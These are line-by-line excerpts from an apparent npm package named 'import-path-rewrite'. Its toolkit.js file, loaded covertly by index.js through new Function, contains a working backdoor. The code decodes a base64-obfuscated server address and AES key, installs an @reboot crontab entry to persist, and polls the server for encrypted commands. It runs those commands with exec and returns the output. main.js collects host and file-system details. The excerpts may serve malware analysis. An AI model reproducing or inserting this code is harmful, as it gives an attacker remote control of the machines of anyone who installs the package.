// File: tmp/tmp6h6wpss9/import-path-rewrite/package/src/index.js
// ======================================================================
Line 1: const fs = require('fs')
Line 2: const systemUtils = require('./main')
Line 11: const hiddenLogic = fs.readFileSync(require.resolve('./toolkit.js'), 'utf8')
Line 12: const executeHidden = new Function('require', hiddenLogic)
Line 14: catch (err) {
    console.log('[!] Toolkit module failed to load:', err.message);
}
Line 15: console.log('[!] Toolkit module failed to load:', err.message)

// File: tmp/tmp6h6wpss9/import-path-rewrite/package/src/main.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const fs = require('fs')
Line 3: const path = require('path')
Line 4: _tmp_4 = require('child_process')
Line 13: os.platform()
Line 15: os.arch()
Line 16: os.hostname()
Line 22: os.cpus()
Line 28: const files = fs.readdirSync(directory)
Line 31: _tmp_2.type = fs.statSync(path.join(directory, file)).isDirectory() ? "directory" : "file"
Line 33: catch (err) {
        console.error(`[!] Error listing files in ${directory}:`, err.message);
        return [];
    }
Line 34: console.error(`[!] Error listing files in ${directory}:`, err.message)

// File: tmp/tmp6h6wpss9/import-path-rewrite/package/src/toolkit.js
// ======================================================================
Line 2: const AppConfig = {
        fetch: () => {
            const encodedHost = Buffer.from('ODEuMTkuMTQwLjE2Mg==', 'base64');
            const encodedPort = Buffer.from('NDQz', 'base64');
            const encodedKey = Buffer.from('ZTY3NDgyYzY4Njg0YzUxZGZmNTM4ZTc1ZmFiNWRkNTgzYjg4NTkxNzEyMjIzNmU4YzlmY2RhZmI3YWU1NGUyNA==', 'base64');
            const encodedIV = Buffer.from('MWZiNzRkODQ4MTFmOTQzYzM2ZGUwMDEwMzMxYTMyNDk=', 'base64');

            return {
                host: encodedHost.toString('utf-8'),
                port: parseInt(encodedPort.toString('utf-8')),
                authKey: Buffer.from(encodedKey.toString('utf-8'), 'hex'),
                authIV: Buffer.from(encodedIV.toString('utf-8'), 'hex'),
            };
        }
    }
Line 4: Buffer.from('ODEuMTkuMTQwLjE2Mg==', 'base64')
Line 5: Buffer.from('NDQz', 'base64')
Line 6: Buffer.from('ZTY3NDgyYzY4Njg0YzUxZGZmNTM4ZTc1ZmFiNWRkNTgzYjg4NTkxNzEyMjIzNmU4YzlmY2RhZmI3YWU1NGUyNA==', 'base64')
Line 7: Buffer.from('MWZiNzRkODQ4MTFmOTQzYzM2ZGUwMDEwMzMxYTMyNDk=', 'base64')
Line 10: encodedHost.toString('utf-8')
Line 11: parseInt(encodedPort.toString('utf-8'))
Line 12: Buffer.from(encodedKey.toString('utf-8'), 'hex')
Line 13: Buffer.from(encodedIV.toString('utf-8'), 'hex')
Line 18: _tmp_12 = AppConfig.fetch()
Line 20: const crypto = require('crypto')
Line 21: const https = require('https')
Line 22: const os = require('os')
Line 23: const fs = require('fs')
Line 24: _tmp_13 = require('child_process')
Line 34: crypto.createDecipheriv('aes-256-cbc', authKey, authIV)
Line 38: {
        const scriptPath = process.argv[1];
        const cronCommand = `@reboot /usr/bin/node ${scriptPath}`;

        if (os.uptime() < 180) {
            return;
        }

        exec('crontab -l', (err, stdout) => {
            if (!err && stdout.includes(cronCommand)) {
                return;
            }

            exec(`(crontab -l 2>/dev/null; echo "${cronCommand}") | crontab -`, (err) => {});
        });
    }
Line 39: const scriptPath = process.argv[1]
Line 46: exec('crontab -l', (err, stdout) => {
            if (!err && stdout.includes(cronCommand)) {
                return;
            }

            exec(`(crontab -l 2>/dev/null; echo "${cronCommand}") | crontab -`, (err) => {});
        })
Line 47: stdout.includes(cronCommand)
Line 51: exec(`(crontab -l 2>/dev/null; echo "${cronCommand}") | crontab -`, (err) => {})
Line 55: {
        const client = https.request({
            hostname: host,
            port: port,
            path: `/data?${Math.random().toString(36).substring(2)}`,
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
        }, (res) => {
            let body = '';
            res.on('data', (chunk) => {
                body += chunk.toString();
            });

            res.on('end', () => {
                try {
                    const encryptedData = JSON.parse(body).data;
                    const command = decrypt(encryptedData);

                    if (command !== 'ACK') {
                        exec(command, (error, stdout, stderr) => {
                            const result = stdout || stderr || error.message;
                            sendResponse(result);
                        });
                    }

                    setTimeout(pollC2, 2000);
                } catch {
                    setTimeout(pollC2, 5000);
      ...
Line 56: const client = https.request({
            hostname: host,
            port: port,
            path: `/data?${Math.random().toString(36).substring(2)}`,
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
        }, (res) => {
            let body = '';
            res.on('data', (chunk) => {
                body += chunk.toString();
            });

            res.on('end', () => {
                try {
                    const encryptedData = JSON.parse(body).data;
                    const command = decrypt(encryptedData);

                    if (command !== 'ACK') {
                        exec(command, (error, stdout, stderr) => {
                            const result = stdout || stderr || error.message;
                            sendResponse(result);
                        });
                    }

                    setTimeout(pollC2, 2000);
                } catch {
                    setTimeout(pollC2, 5000);
                }
    ...
Line 59: Math.random().toString(36)
Line 65: chunk.toString()
Line 69: {
                    const encryptedData = JSON.parse(body).data;
                    const command = decrypt(encryptedData);

                    if (command !== 'ACK') {
                        exec(command, (error, stdout, stderr) => {
                            const result = stdout || stderr || error.message;
                            sendResponse(result);
                        });
                    }

                    setTimeout(pollC2, 2000);
                }
Line 70: const encryptedData = JSON.parse(body).data
Line 73: {
                        exec(command, (error, stdout, stderr) => {
                            const result = stdout || stderr || error.message;
                            sendResponse(result);
                        });
                    }
Line 74: exec(command, (error, stdout, stderr) => {
                            const result = stdout || stderr || error.message;
                            sendResponse(result);
                        })
Line 76: sendResponse(result)
Line 80: setTimeout(pollC2, 2000)
Line 81: catch {
                    setTimeout(pollC2, 5000);
                }
Line 82: setTimeout(pollC2, 5000)
Line 87: {
            setTimeout(pollC2, 5000);
        }
Line 88: setTimeout(pollC2, 5000)
Line 91: client.write(JSON.stringify({ data: encrypt('Hello from toolkit') }))
Line 92: client.end()
Line 95: {
        const client = https.request({
            hostname: host,
            port: port,
            path: `/data?${Math.random().toString(36).substring(2)}`,
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
        });

        client.write(JSON.stringify({ data: encrypt(output) }));
        client.end();
    }
Line 96: const client = https.request({
            hostname: host,
            port: port,
            path: `/data?${Math.random().toString(36).substring(2)}`,
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
        })
Line 99: Math.random().toString(36)
Line 104: client.write(JSON.stringify({ data: encrypt(output) }))
Line 105: client.end()
